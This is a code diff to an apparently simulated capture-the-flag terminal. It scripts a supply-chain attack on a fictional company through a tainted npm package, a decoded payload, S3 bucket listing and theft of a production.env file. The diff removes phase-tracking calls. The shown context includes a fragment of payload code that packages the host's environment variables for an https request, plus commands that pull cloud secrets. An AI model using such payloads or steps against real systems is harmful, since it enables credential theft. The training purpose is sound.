@@ -768,7 +768,6 @@ DEPLOY_SECRET={{FLAG:root}}
             // npm install @crestline/build-utils
             if ((sub === 'install' || sub === 'i') && target) {
                 C3Config._pkgDownloaded = true;
-                if (engine) engine.advancePhase && engine.advancePhase('pkg_analysis');
                 return `npm warn registry Using registry https://npm.crestline-internal.dev
 npm warn deprecated @crestline/build-utils@2.1.4: [SECURITY] This version contains a known supply chain vulnerability
 
@@ -833,7 +832,6 @@ added 847 packages in 3.4s
             // Accept: base64 -d, --decode with any input containing the encoded payload
             if (fullCmd.includes('-d') || fullCmd.includes('--decode')) {
                 C3Config._payloadDecoded = true;
-                if (engine) engine.advancePhase && engine.advancePhase('cicd_exploit');
                 return `const https=require('https');const os=require('os');const env=process.env;
 const payload={host:os.hostname(),env};
 const options={
@@ -917,7 +915,6 @@ Default output format [None]: json
                 }
 
                 // aws s3 ls (list all buckets)
-                if (engine) engine.advancePhase && engine.advancePhase('cloud_pivot');
                 return C3Config._s3.buckets.map(b =>
                     `${b.created}  ${b.name}`
                 ).join('\n');
@@ -929,7 +926,6 @@ Default output format [None]: json
                 const dest = args[3] || '.';
 
                 if (src.includes('production.env')) {
-                    if (engine) engine.advancePhase && engine.advancePhase('impact');
                     return `download: s3://crestline-prod-configs/env/production.env to ./production.env
 
 [+] File downloaded: production.env (4.1 KB)
@@ -986,7 +982,6 @@ Default output format [None]: json
                 if (!C3Config._s3Enumerated && !C3Config._awsCredsFound) {
                     return 'cat: production.env: No such file or directory\n[!] Download it first: aws s3 cp s3://crestline-prod-configs/env/production.env .';
                 }
-                if (engine) engine.advancePhase && engine.advancePhase('impact');
                 return C3Config._prodEnv;
             }
 
